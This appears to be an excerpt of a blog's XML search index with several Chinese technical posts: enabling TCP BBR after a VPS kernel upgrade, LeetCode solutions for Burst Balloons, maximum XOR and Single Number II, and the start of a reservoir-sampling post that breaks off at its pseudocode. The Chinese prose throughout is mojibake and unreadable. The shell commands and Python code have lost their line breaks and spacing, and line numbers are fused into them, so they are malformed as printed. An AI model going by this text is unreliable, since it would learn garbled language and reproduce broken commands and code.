çš„è¿ç®—ç¬¦é‡è½½è¿™ä¸€æ¨¡å¼æä¾›äº†ä¸°å¯Œçš„æ•°å€¼ç±»å‹ï¼Œé™¤äº†å†…ç½®çš„ç±»å‹ä¹‹å¤–ï¼Œè¿˜æœ‰decimal.Decimal å’Œ fractions.Fractionã€‚è¿™äº›éƒ½æ”¯æŒä¸­ç¼€è¿ç®—ã€‚]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>magic method</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VPSå‡çº§å†…æ ¸ï¼Œå¼€å¯TCP BBR å®ç°é«˜æ•ˆå•è¾¹åŠ é€Ÿ]]></title>
    <url>%2F2017%2F04%2F13%2Fubuntu_tcp_bbr%2F</url>
    <content type="text"><![CDATA[è‡ªä»é”é€Ÿå‘å¸ƒä»¥æ¥ï¼Œè¿™æ¬¾ç‰›é€¼çš„å•è¾¹åŠ é€Ÿç¥å™¨çš„ç¡®ä¸ºä¸€äº›çº¿è·¯ä¸å¤ªä¼˜ç§€çš„æœåŠ¡å™¨å¸¦æ¥äº†æ›´ä¼˜ç§€çš„ä½“éªŒã€‚ä½†æ˜¯ç”±äºè¿‡é«˜çš„ä»·æ ¼å’Œä¸å†ä½ç«¯å”®å–ã€‚å¯¼è‡´äº†æˆ‘ä»¬é™¤äº†ä½¿ç”¨è¿™ä¸ªè½¯ä»¶çš„ç ´è§£ç‰ˆä¹‹å¤–ï¼Œå¹¶æ²¡åŠæ³•å¾—åˆ°ä¸€ä¸ªå…è´¹å¥½ç”¨çš„å•è¾¹åŠ é€ŸåŠŸèƒ½ã€‚ 1. ä»é”é€Ÿåˆ°BBRè‡ªä»é”é€Ÿå‘å¸ƒä»¥æ¥ï¼Œè¿™æ¬¾ç‰›é€¼çš„å•è¾¹åŠ é€Ÿç¥å™¨çš„ç¡®ä¸ºä¸€äº›çº¿è·¯ä¸å¤ªä¼˜ç§€çš„æœåŠ¡å™¨å¸¦æ¥äº†æ›´ä¼˜ç§€çš„ä½“éªŒã€‚ä½†æ˜¯ç”±äºè¿‡é«˜çš„ä»·æ ¼å’Œä¸å†ä½ç«¯å”®å–ã€‚å¯¼è‡´äº†æˆ‘ä»¬é™¤äº†ä½¿ç”¨è¿™ä¸ªè½¯ä»¶çš„ç ´è§£ç‰ˆä¹‹å¤–ï¼Œå¹¶æ²¡åŠæ³•å¾—åˆ°ä¸€ä¸ªå…è´¹å¥½ç”¨çš„å•è¾¹åŠ é€ŸåŠŸèƒ½ã€‚è€Œç”±äºç ´è§£å¹¶ä¸å®Œç¾ï¼Œä½¿å¾—åœ¨ä½¿ç”¨ä¸­ä¼šå‡ºç°ä¸€äº›æ— æ³•è§£å†³çš„é—®é¢˜ï¼Œæ¯”å¦‚éšç€è¿è¡Œæ—¶é—´å˜ä¹…ï¼ŒåŠ é€Ÿæ•ˆæœè¶Šæ¥è¶Šå·®ï¼ˆä½“éªŒä¸­çš„é—®é¢˜å°±æ˜¯youtubeè§‚çœ‹è§†é¢‘ä»æµç•…1080påˆ°ä¸æµç•…480pã€‚ã€‚ã€‚ã€‚ï¼‰ä½†æ˜¯å»å¹´ä¸‹åŠå¹´è°·æ­Œä¸ºæˆ‘ä»¬å¸¦æ¥äº†æ–°çš„TCPæ‹¥å¡æ§åˆ¶ç®—æ³•BBRï¼ˆBottleneck Bandwidth and RTT)ã€‚ ç›®å‰åœ¨ Linux Kernel 4.9 åŠä¹‹åçš„ç‰ˆæœ¬ä¸­åŠ å…¥äº†è¯¥ç®—æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦å‡çº§å†…æ ¸å°±å¯ä»¥ä½¿ç”¨BBRå¼€å¯å•è¾¹åŠ é€Ÿäº†ã€‚ 2. å‡çº§Ubuntuå†…æ ¸ä¸Šé¢è¯´åˆ° BBRåªè¢« Linux Kernel 4.9 ä»¥åçš„ç‰ˆæœ¬æ”¯æŒï¼Œè€ŒVPSå¤šç”¨ä¸€äº›æ¯”è¾ƒç¨³å®šçš„æ—§ç‰ˆå†…æ ¸ã€‚æ‰€ä»¥æˆ‘ä»¬è¦åšçš„ç¬¬ä¸€æ­¥å°±æ˜¯å‡çº§å†…æ ¸: é¦–å…ˆæŸ¥çœ‹è‡ªå·±çš„ç³»ç»Ÿå†…æ ¸ï¼š 1$uname -a å¦‚æœ ç³»ç»Ÿç‰ˆæœ¬æ˜¯4.9åŠä»¥å, å‡çº§å†…æ ¸è¿™ä¸€æ­¥å°±å¯ä»¥è·³è¿‡æ‹‰~ åˆ°ubuntuå®˜æ–¹å†…æ ¸æºæ‰¾åˆ°æœ€æ–°çš„å†…æ ¸ï¼šæ¯”å¦‚ï¼š http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.11-rc6/linux-image-4.11.0-041100rc6-generic_4.11.0-041100rc6.201704091331_amd64.deb æ‰¾åˆ°ä¹‹åä¸‹è½½è¿™ä¸ªdebåŒ…ï¼š 1$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.11-rc6/linux-image-4.11.0-041100rc6-generic_4.11.0-041100rc6.201704091331_amd64.deb å®‰è£…å†…æ ¸ï¼š 1$ dpkg -i linux-image-4.11.0-041100rc6-generic_4.11.0-041100rc6.201704091331_amd64.deb æŸ¥çœ‹å·²å®‰è£…çš„å†…æ ¸ï¼š 1$ dpkg-l|grep linux-image ï¼ˆå¯é€‰ï¼‰å¸è½½æ—§ç‰ˆå†…æ ¸ï¼š 1$ apt-get purge $&#123;old_linux_image&#125; æ›´æ–° grub æ–‡ä»¶å¹¶é‡å¯ 12$ update-grub$ reboot é‡å¯ä¹‹åå°±æ˜¯æ–°å†…æ ¸æ‹‰~ 3. å¼€å¯ BBR åŠ é€Ÿ ä¿®æ”¹ç³»ç»Ÿé…ç½®æ–‡ä»¶ sysctl.config 12$ echo"net.core.default_qdisc=fq"&gt;&gt;/etc/sysctl.conf$ echo"net.ipv4.tcp_congestion_control=bbr"&gt;&gt;/etc/sysctl.conf ä¿å­˜å¹¶åº”ç”¨ä¿®æ”¹ 1$ sysctl-p æŸ¥çœ‹æ˜¯å¦ç”Ÿæ•ˆï¼š 1$ sysctl net.ipv4.tcp_available_congestion_control å¦‚æœè¾“å‡ºå¦‚ä¸‹ï¼š net.ipv4.tcp_available_congestion_control=bbr cubic renè¡¨æ˜å¼€å¯æˆåŠŸ 4. å…³é—­ TCP BBRæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ä¿®æ”¹ç³»ç»Ÿé…ç½®ï¼š 1234sed-i'/net\.core\.default_qdisc=fq/d'/etc/sysctl.confsed-i'/net\.ipv4\.tcp_congestion_control=bbr/d'/etc/sysctl.confsysctl-preboot æ‰§è¡Œå®Œä¸Šé¢çš„ä»£ç ï¼Œå³ ä¿®æ”¹é…ç½®-é‡å¯VPS ä¹‹åå°±å¯ä»¥å…³é—­BBRåŠ é€Ÿäº†ã€‚]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>vps</tag>
        <tag>tcp-bbr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode312 åˆ†æ²»æ³•å’ŒåŠ¨æ€è§„åˆ’]]></title>
    <url>%2F2017%2F03%2F09%2FLeetCode312%2F</url>
    <content type="text"><![CDATA[LeetCode 312 è§£é¢˜æŠ¥å‘Š æœ€è¿‘å¼€å§‹æ¸æ¸å¿™äº†èµ·æ¥ï¼ŒåŠ ä¸ŠæŒ‰Acceptanceåšé¢˜ï¼Œåé¢é¢˜ç›®ä¹Ÿå¼€å§‹æœ‰ç‚¹å¤æ‚äº†ï¼Œæ‰€ä»¥åªèƒ½å‹‰å¼ºç»´æŒä¸€å¤©åšä¸€é“é¢˜ã€‚ä»Šå¤©ä¸‹åˆå·®ä¸å¤šæŠŠè¿™å‘¨ä»»åŠ¡å®Œæˆäº†ï¼Œæ‰€ä»¥ç¨å¾®åˆ’ä¸‹æ°´ï¼Œå†™ä¸€ä¸‹è¿™ä¸¤å¤©ç¢°åˆ°çš„ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„é¢˜ç›®ï¼ˆå¯¹æˆ‘æ¥è¯´=ã€‚= é¢˜ç›®å¦‚ä¸‹ï¼š 312. Burst BalloonsTotal Accepted: 23001Total Submissions: 54845Difficulty: HardContributors: AdminGiven n balloons, indexed from 0 to n-1. Each balloon is painted with a number on it represented by array nums. You are asked to burst all the balloons. If the you burst balloon i you will get nums[left] nums[i] nums[right] coins. Here left and right are adjacent indices of i. After the burst, the left and right then becomes adjacent. Find the maximum coins you can collect by bursting the balloons wisely. Note:(1) You may imagine nums[-1] = nums[n] = 1. They are not real therefore you can not burst them.(2) 0 â‰¤ n â‰¤ 500, 0 â‰¤ nums[i] â‰¤ 100 Example: Given [3, 1, 5, 8] Return 167 nums = [3,1,5,8] â€“&gt; [3,5,8] â€“&gt; [3,8] â€“&gt; [8] â€“&gt; [] coins = 3 1 5 + 3 5 8 + 1 3 8 + 1 8 1 = 167 çœ‹åˆ°è¿™ä¸ªé¢˜ç›®ï¼Œæœ€ç®€å•çš„æƒ³æ³•æ˜¯ç”¨å›æº¯æ³•ï¼Œä½¿ç”¨å›æº¯æ³•ä¸€å…±éœ€è¦næ­¥ï¼Œç¬¬iæ­¥éœ€è¦å°è¯•é€‰å‡ºçš„æ•°æœ‰n-iä¸ª,è¿™æ ·æˆ‘ä»¬å¾—åˆ°çš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n!)ï¼Œéå¸¸å¤§ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ²¡æœ‰å°è¯•çš„å¿…è¦ã€‚æˆ‘ä»¬éœ€è¦æ€è€ƒçš„æ˜¯è¿™ä¸ªæ–¹æ³•ä¸­æœ‰æ²¡æœ‰å†—ä½™çš„æ­¥éª¤å¯ä»¥ç®€åŒ–ã€‚ æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ï¼Œæ¯æ¬¡é€‰æ‹©çˆ†ç ´çš„æ°”çƒï¼Œä¸ä¸Šä¸€æ­¥é€‰æ‹©çˆ†ç ´çš„æ°”çƒæ˜¯æ²¡æœ‰å…³ç³»çš„ï¼Œè¿™æ»¡è¶³äº†åŠ¨æ€è§„åˆ’â€œæ— åæ•ˆæ€§â€çš„ç‰¹ç‚¹ã€‚ è¿™æ ·æˆ‘ä»¬å¯ä»¥ç”¨ä»ä¸‹åˆ°ä¸Šçš„åŠ¨æ€è§„åˆ’æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå³è®¡ç®—å°é•¿åº¦æ•°ç»„çš„æœ€å¤§ç§¯åˆ†å€¼ï¼Œé€šè¿‡å°é•¿åº¦çš„æ•°ç»„çš„ç´¯åŠ æ¥è®¡ç®—æ•´ä¸ªæ•°ç»„çš„æœ€å¤§ç§¯åˆ†å€¼ã€‚è¿™æ ·å¦‚æœè®¡ç®—é•¿åº¦ä¸ºkçš„å­æ•°ç»„ï¼Œéœ€è¦éœ€è¦æ‰¾åˆ°çš„ä¸åŒæƒ…å†µæ˜¯C(k, n),éœ€è¦ä»é•¿åº¦ä¸º1æ‰¾åˆ°é•¿åº¦ä¸ºnï¼Œè¿™æ ·æœ€åçš„æƒ…å†µä¹Ÿæ˜¯O(n!)ï¼ˆã€‚ã€‚ã€‚ã€‚ã€‚ï¼‰è™½ç„¶è¯´æ²¡å¥½å¤šå°‘ï¼Œä½†æ˜¯è‡³å°‘ç¨å¾®ç®€åŒ–äº†ä¸€ç‚¹æ—¶é—´å¤æ‚åº¦ã€‚ã€‚ã€‚ã€‚ åœ¨ç”¨ä¸Šé¢çš„è¿™ä¸ªæ€è·¯æ€è€ƒé—®é¢˜çš„æ—¶å€™ï¼Œåˆå¯ä»¥æ³¨æ„åˆ°ï¼Œå­é—®é¢˜ä¸çˆ¶é—®é¢˜çš„è§£å†³æ–¹å¼éå¸¸ç±»ä¼¼ï¼Œå¯ä»¥è€ƒè™‘ç”¨åˆ†æ²»æ³•é€’å½’çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ è¯´åˆ°åˆ†æ²»ï¼Œæˆ‘ä»¬æœ€ç›´è§‚çš„æƒ³åˆ°çš„ä½¿ç”¨åˆ†æ²»çš„æ–¹æ³•æ˜¯:å½“ä¸€ä¸ªæ°”çƒçˆ†è£‚åï¼Œå®ƒä¸¤è¾¹çš„æ°”çƒä¸²åˆ†åˆ«å½¢æˆçˆ†è£‚å‰æ°”çƒä¸²çš„å­é—®é¢˜ã€‚ä½†æ˜¯åˆ†æ²»æ³•è¦æ±‚çš„æ˜¯ç›¸äº’ç‹¬ç«‹çš„å­é—®é¢˜ï¼Œè€Œç…§ä¸Šé¢è¿™ç§æ–¹æ³•ï¼Œç”±äºçˆ†ç ´åï¼Œå·¦è¾¹æ°”çƒä¸²çš„æœ€åä¸€ä¸ªæ°”çƒå’Œå³è¾¹æ°”çƒä¸²çš„æœ€å·¦è¾¹ä¸€ä¸ªæ°”çƒç›¸é‚»äº†ï¼Œè¿™æ ·å¯¼è‡´çš„ç»“æœæ˜¯åˆ†ç¦»å‡ºçš„ä¸¤ä¸ªå­é—®é¢˜ç›¸äº’å½±å“äº†ï¼Œæ‰€ä»¥è¿™ç§åˆ†æ²»æ˜¯ä¸å¯è¡Œçš„ã€‚ å¦‚æœæˆ‘ä»¬é€†å‘æ€ç»´ä¸€ä¸‹ï¼Œæ‰¾åˆ°æœ€åçˆ†ç ´çš„æ°”çƒï¼Œå†æŠŠå®ƒçš„ä¸¤è¾¹åˆ†æˆä¸¤ä¸ªå­é—®é¢˜æ¥è§£å†³ï¼Œå¯ä¸å¯è¡Œå‘¢ï¼Ÿç”±äºæœ€åä¸€ä¸ªçˆ†ç ´çš„æ°”çƒï¼Œçˆ†ç ´æ—¶é•¿åº¦ä¸º1ï¼Œæ ¹æ®é¢˜ç›®å®šä¹‰å·¦å³éƒ½ç”¨1æ¥å¡«å……ï¼Œè¿™æ ·ç”±äºé¢å¤–å¡«å……çš„1ï¼Œä½¿å¾—è¿™ä¸ªæ°”çƒå¹¶ä¸ä¼šå½±å“å­é—®é¢˜çš„åˆ’åˆ†ï¼Œè¿™æ ·çš„åˆ†æ²»æ˜¯å¯è¡Œçš„ã€‚ æœ€åæˆ‘ä»¬é€‰æ‹©äº†ç”±ä¸‹è€Œä¸Šçš„åŠ¨æ€è§„åˆ’å’Œåˆ†æ²»æ³•è§£å†³é¢˜ç›®æ‰€æåˆ°çš„é—®é¢˜ã€‚ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617class Solution(object): def maxCoins(self, nums): #å¢åŠ æ°”çƒä¸²çš„è¾¹ç•Œ coins = [1] + [num for num in nums if num] + [1] n = len(coins) dp = [[0] * n for _ in xrange(n)] for l in xrange(2, n): #è®¡ç®—æ¯ä¸ªé•¿åº¦ä¸ºlçš„å­åºåˆ— for left in xrange(0, n-l): right = left + l for j in xrange(left+1, right): #ç”±äºæ˜¯è‡ªä¸‹è€Œä¸Šçš„åŠ¨æ€è§„åˆ’ï¼Œæ‰€ä»¥å…å»äº†åˆ†æ²»æ³•ä¸­ä½¿ç”¨é€’å½’è§£å†³å­é—®é¢˜è¿™ä¸€æ­¥ #coins[left] * coins[j] * coins[right] è¿™ä¸ªè¡¨è¾¾å¼æ˜¯æŒ‡çˆ†ç ´æœ€åä¸€ä¸ªæ°”çƒäº§ç”Ÿçš„è¿ç®— dp[left][right] = max(dp[left][right], dp[left][j] + \ dp[j][right] + coins[left] * coins[j] * coins[right]) return dp[0][n-1] è¿™æ ·ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„é—®é¢˜å°±è¿åˆƒè€Œè§£äº†ï¼Œè¿™æ ·åšçš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n^3)ã€‚æ€»ç»“èµ·æ¥å°±æ˜¯ï¼šéå¸¸æš´åŠ›çš„æ–¹æ³• â€“&gt;ç®€åŒ–å†—ä½™â€“&gt; ä¸é‚£ä¹ˆæš´åŠ›çš„æ–¹æ³• â€“&gt;ç®€åŒ–å†—ä½™â€“&gt; æ¯”è¾ƒç®€å•çš„æ–¹æ³• â€“&gt;ç®€åŒ–å†—ä½™â€“&gt; å¾ˆå¥½çš„æ–¹æ³•å…¶å®è¿™ä¸ªé—®é¢˜æˆ‘æƒ³äº†å¾ˆä¹…éƒ½æ²¡æƒ³å‡ºæ¥ï¼Œæœ€ååœ¨discussé‡Œçœ‹åˆ°è¿™ä¸ªæ¯”è¾ƒå¥½çš„è§£å†³æ–¹å¼ï¼Œè¿™ä¸ªé—®é¢˜çš„æ€è€ƒè¿‡ç¨‹ä¹Ÿæ˜¯éå¸¸å€¼å¾—å€Ÿé‰´çš„ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹,ä¹Ÿå°½æˆ‘æ‰€èƒ½è®²çš„æ¯”è¾ƒæ˜ç™½ä¸€äº›ã€‚ (æºœäº†]]></content>
      <categories>
        <category>Leetcode</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Divide and Conquer</tag>
        <tag>Dynamic Programming</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åˆ©ç”¨Pythonä½è¿ç®—ç®€åŒ–æ—¶é—´/ç©ºé—´å¤æ‚åº¦]]></title>
    <url>%2F2017%2F02%2F24%2Fbitwise-operation-in-leetcode%2F</url>
    <content type="text"><![CDATA[åˆ©ç”¨ä½è¿ç®—ç®€åŒ–ç®—æ³•é¢˜ä¸­çš„æ—¶é—´/ç©ºé—´å¤æ‚åº¦ æœ€è¿‘ä¸¤å¤©ç¢°åˆ°ä¸¤ä¸ªç”¨ä½è¿ç®—è§£å†³çš„é¢˜ç›®ï¼Œæ°å¥½ä¸€ä¸ªåˆ©ç”¨ä½è¿ç®—ç®€åŒ–äº†æ—¶é—´å¤æ‚åº¦ï¼Œå¦ä¸€ä¸ªç®€åŒ–äº†ç©ºé—´å¤æ‚åº¦ï¼Œæ‰€ä»¥åšä¸ªè®°å½•åŠ æ·±ä¸€ä¸‹å°è±¡ã€‚ç¬¬ä¸€ä¸ªé¢˜ç›®æ˜¯LeetCode 421. Maximum XOR of Two Numbers in an Array:**æ³¨ï¼šè¿™é¢˜ä¸­æåˆ°çš„å¼‚æˆ–å‡æ˜¯æŒ‰ä½å¼‚æˆ–ã€‚ Given a non-empty array of numbers, a0, a1, a2, â€¦ , an-1, where 0 â‰¤ ai &lt; 231. Find the maximum result of ai XOR aj, where 0 â‰¤ i, j &lt; n. Could you do this in O(n) runtime? Example: Input: [3, 10, 5, 25, 2, 8] Output: 28 Explanation: The maximum result is 5 ^ 25 = 28. è¿™é¢˜çš„æè¿°ä¸­æ˜ç¡®æŒ‡å‡ºäº†do this in O(n) runtime ï¼Œå¦‚æœè¦ä¸¤ä¸¤å¼‚æˆ–æ¯”è¾ƒå¤§å°çš„è¯å¾ˆæ˜æ˜¾éœ€è¦O(n^2)çš„æ—¶é—´å¤æ‚åº¦ã€‚ é‚£æ€ä¹ˆæ ·æ‰èƒ½ç”¨ä½è¿ç®—è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ å¦‚æœæˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ˜¯è¿™æ ·ï¼š å‡å®šæ•°ç»„ä¸­æ‰€æœ‰çš„å…ƒç´ éƒ½å¯ä»¥ç”¨8ä½2è¿›åˆ¶æ•°æ¥è¡¨ç¤ºï¼Œå¦‚æœæˆ‘ä»¬å·²ç»çŸ¥é“æ‰€æœ‰æ•°å‰7ä½çš„æœ€å¤§å¼‚æˆ–å€¼maxorï¼Œæ€æ ·æ±‚8ä½æ•°çš„æœ€å¤§å¼‚æˆ–å€¼ï¼Ÿ å¾ˆå®¹æ˜“æƒ³åˆ°8ä½æ•°çš„æœ€å¤§å¼‚æˆ–å€¼åªå¯èƒ½æ˜¯å‰7ä½åé¢è·Ÿä¸Š0æˆ–1ï¼Œ æ‰€ä»¥æˆ‘ä»¬å…ˆå‡è®¾åé¢èƒ½è·Ÿä¸Š1ï¼Œå³å‡è®¾çš„æœ€å¤§å¼‚æˆ–å€¼ä¸º maxornew =ï¼ˆmaxor &lt;&lt; 1ï¼‰+ 1; æˆ‘ä»¬è¦æ‰¾åˆ°è¿™ä¸ªæœ€å¤§å¼‚æˆ–çš„å€¼ä¼šä¸ä¼šå‡ºç°ï¼Œä¸€ç§ç®€å•çš„åŠæ³•æ˜¯2ä¸ªå¾ªç¯éå†æ•°ç»„ï¼Œç„¶åä¸¤ä¸¤ç®—å‡ºå¼‚æˆ–çš„å€¼ï¼Œçœ‹æ˜¯å¦èƒ½æ‰¾åˆ°ä¸€ä¸ªç»“æœä¸maxornewç›¸åŒã€‚ä½†æ˜¯è¿™æ ·ä¼šä½¿æ—¶é—´å¤æ‚åº¦å˜æˆO(n^2)ï¼Œä¸æ»¡è¶³é¢˜ç›®çš„è¦æ±‚ã€‚ä½†æ˜¯æŒ‰ä½å¼‚æˆ–æœ‰ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„æ€§è´¨ï¼š è‹¥ x ^ y = z ,é‚£ä¹ˆ x ^ z = y , y ^ z = x è¿™æ ·æˆ‘ä»¬åªç”¨æ‹¿å‡ºæ•°ç»„ä¸­æ¯ä¸€ä¸ªå…«ä½äºŒè¿›åˆ¶æ•°ï¼Œ ä¸maxornewè¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå†åˆ¤æ–­å¼‚æˆ–å¾—åˆ°çš„ç»“æœæ˜¯å¦åœ¨æ•°ç»„ä¸­ï¼Œå¦‚æœä¸åœ¨çš„è¯ï¼Œæœ€å¤§çš„å¼‚æˆ–å€¼å°±æ˜¯(maxor&lt;&lt;1) ,è¿™æ ·æ—¶é—´å¤æ‚åº¦å°±è¢«ç®€åŒ–æˆä¸ºäº†O(n) ä¸Šé¢çš„è¯´å®Œäº†ï¼Œè¿™ä¸ªé¢˜ç›®ä¸­æè¿°çš„é—®é¢˜ä¹Ÿå°±è¿åˆƒè€Œè§£äº†ã€‚é¢˜ç›®ä¸­æåˆ°çš„numbersï¼Œç”±äºåœ¨ç»™å‡ºçš„å‡½æ•°å£°æ˜ä¸­ä¼ å…¥å‚æ•°ä¸ºList[int], LeetCodeä¸­è¿™æ ·çš„æ•°ä¸€èˆ¬è®¤ä¸ºæ˜¯ 32ä½çš„intã€‚ å¯¹numbersä¸­æ¯ä¸€ä¸ªæ•°å–å‰nä½(1&lt;=n&lt;=32)è®¡ç®—æœ€å¤§å¼‚æˆ–çš„å€¼ï¼Œå¹¶ä¸”æŒ‰ç…§ä¸Šé¢è®¡ç®—ç¬¬å…«ä½çš„æ–¹æ³•è®¡ç®—ä¸‹ä¸€ä½ï¼Œå°±å¯ä»¥å¾—åˆ°æ•´ä¸ªæ•°ç»„çš„æœ€å¤§å¼‚æˆ–å€¼ã€‚ 12345678def findMaximumXOR(self, nums): answer = 0 for i in range(32)[::-1]: answer &lt;&lt;= 1 prefixes = &#123;num &gt;&gt; i for num in nums&#125; answer += any(answer^1 ^ p in prefixes for p in prefixes) #print bin(answer)[2:] return answer è¿™é¢˜åˆ©ç”¨ä½è¿ç®—å°†åŸæœ¬éœ€è¦O(n^2)çš„æ—¶é—´å¤æ‚åº¦ç®€åŒ–æˆäº†O(n) ============================================================================ ç¬¬äºŒä¸ªé¢˜ç›®æ˜¯ç®€åŒ–ç©ºé—´å¤æ‚åº¦ï¼ŒLeetCode 137. Single Number IIï¼š Given an array of integers, every element appears three times except for one, which appears exactly once. Find that single one. Note:Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory? å°±æ˜¯è¯´ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œé™¤äº†å…¶ä¸­ä¸€ä¸ªæ•°åªå‡ºç°ä¸€æ¬¡ï¼Œå…¶ä»–éƒ½å‡ºç°äº†ä¸‰æ¬¡ï¼Œæ‰¾å‡ºè¿™ä¸ªåªå‡ºç°äº†ä¸€æ¬¡çš„æ•°ã€‚é¦–å…ˆæˆ‘æƒ³åˆ°çš„æ˜¯ä¸€ä¸ªæ—¶é—´å¤æ‚åº¦ä¸ºO(n),ä½¿ç”¨çš„é¢å¤–ç©ºé—´ä¹Ÿæ˜¯O(n)çš„è§£æ³•ï¼š 1234567891011121314def singleNumber(self, nums): """ :type nums: List[int] :rtype: int """ numdict = &#123;&#125; for i in nums: if i in numdict: numdict[i]+=1 else: numdict[i]=1 for i in nums: if numdict[i]==1: return i ç®€å•æ¥è¯´å°±æ˜¯éå†æ•°ç»„çš„åŒæ—¶è®°å½•æ¯ä¸ªæ•°å‡ºç°çš„æ¬¡æ•°ï¼Œç¬¬äºŒæ¬¡éå†çš„æ—¶å€™æ‰¾å‡ºå‡ºç°äº†ä¸€æ¬¡çš„æ•°ã€‚ å¦‚æœè¦å°†ç©ºé—´å¤æ‚åº¦ç®€åŒ–æˆO(1), ä½¿ç”¨ä½è¿ç®—æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ï¼š å°†æ‰€æœ‰æ•°è½¬æ¢æˆ32ä½çš„2è¿›åˆ¶è¡¨ç¤º æŠŠæ¯ä¸€ä½çš„å€¼åŠ èµ·æ¥å¯¹3å–ä½™ è½¬æ¢æˆåè¿›åˆ¶è¡¨ç¤º Pythonå°†è´Ÿæ•´æ•°è½¬æ¢æˆäºŒè¿›åˆ¶æ•°çš„æ—¶å€™ï¼Œç›´æ¥æ˜¯â€™-â€˜åŠ ä¸Šè¿™ä¸ªæ•°çš„ç»å¯¹å€¼çš„äºŒè¿›åˆ¶è¡¨ç¤ºï¼Œæ‰€ä»¥è´Ÿå·å•ç‹¬è®¡ç®—ã€‚ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617class Solution(object): def singleNumber(self, nums): """ :type nums: List[int] :rtype: int """ sumlist = [0]*32 summary, negcnt = 0, 0 for i in nums: negcnt += i &lt; 0 i = abs(i) bitwise = format(i, '032b') for j in xrange(32): sumlist[j] += int(bitwise[j]) for i in xrange(32): summary += 2**(31-i)*(sumlist[i]%3) return summary*[1,-1][negcnt%3] å’Œä¸Šé¢çš„æ–¹æ³•æ¯”èµ·æ¥ï¼Œé¢å¤–ç©ºé—´ç®€åŒ–æˆäº†å¸¸æ•°ï¼Œ å³O(1)ã€‚ ä¸è¿‡è¯è¯´å›æ¥ï¼Œè¿™æ˜¯ä¸€ç§ç”¨æ—¶é—´æ¢ç©ºé—´çš„åšæ³•ï¼Œä¸Šé¢çš„åšæ³•æ—¶é—´æ˜¯2nï¼Œ è¿™ä¸ªæ˜¯32nï¼Œè™½ç„¶å¤æ‚åº¦éƒ½æ˜¯O(n),ä½†æ˜¯å®é™…è¿è¡Œæ—¶é—´å·®è·è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ã€‚ ï¼ˆ Â· x Â· ï¼‰~]]></content>
      <categories>
        <category>Leetcode</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Bitwise Operation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode382 è“„æ°´æ± æŠ½æ ·ç®—æ³•]]></title>
    <url>%2F2017%2F02%2F16%2FLeetCode382%2F</url>
    <content type="text"><![CDATA[LeetCode 382 è§£é¢˜æŠ¥å‘Š LeetCode382 è“„æ°´æ± æŠ½æ ·ç®—æ³•é¦–å…ˆè¯´ä¸€ä¸‹è“„æ°´æ± æŠ½æ ·ç®—æ³•ï¼š é—®é¢˜åœºæ™¯ ç»™ä½ ä¸€ä¸ªé•¿åº¦ä¸ºNçš„é“¾è¡¨ã€‚Nå¾ˆå¤§ï¼Œä½†ä½ ä¸çŸ¥é“Næœ‰å¤šå¤§ã€‚ä½ çš„ä»»åŠ¡æ˜¯ä»è¿™Nä¸ªå…ƒç´ ä¸­éšæœºå–å‡ºkä¸ªå…ƒç´ ã€‚ä½ åªèƒ½éå†è¿™ä¸ªé“¾è¡¨ä¸€æ¬¡ã€‚ä½ çš„ç®—æ³•å¿…é¡»ä¿è¯å–å‡ºçš„å…ƒç´ æ°å¥½æœ‰kä¸ªï¼Œä¸”å®ƒä»¬æ˜¯å®Œå…¨éšæœºçš„ï¼ˆå‡ºç°æ¦‚ç‡å‡ç­‰ï¼‰ã€‚ é—®é¢˜è§£å†³è“„æ°´æ± æŠ½æ ·ç®—æ³• è¯¥ç®—æ³•æ˜¯é’ˆå¯¹ä»ä¸€ä¸ªåºåˆ—ä¸­éšæœºæŠ½å–ä¸é‡å¤çš„kä¸ªæ•°ï¼Œä¿è¯æ¯ä¸ªæ•°è¢«æŠ½å–åˆ°çš„æ¦‚ç‡ä¸ºk/nè¿™ä¸ªé—®é¢˜è€Œæ„å»ºçš„ã€‚åšæ³•æ˜¯ï¼š -é¦–å…ˆæ„å»ºä¸€ä¸ªå¯æ”¾kä¸ªå…ƒç´ çš„è“„æ°´æ± ï¼Œå°†åºåˆ—çš„å‰kä¸ªå…ƒç´ æ”¾å…¥è“„æ°´æ± ä¸­ã€‚ç„¶åä»ç¬¬k+1ä¸ªå…ƒç´ å¼€å§‹ï¼Œä»¥k/nçš„æ¦‚ç‡æ¥å†³å®šè¯¥å…ƒç´ æ˜¯å¦è¢«æ›¿æ¢åˆ°æ± å­ä¸­ã€‚ å½“éå†å®Œæ‰€æœ‰å…ƒç´ ä¹‹åï¼Œå°±å¯ä»¥å¾—åˆ°éšæœºæŒ‘é€‰å‡ºçš„kä¸ªå…ƒç´ ã€‚å¤æ‚åº¦ä¸ºO(n). ä¼ªä»£ç 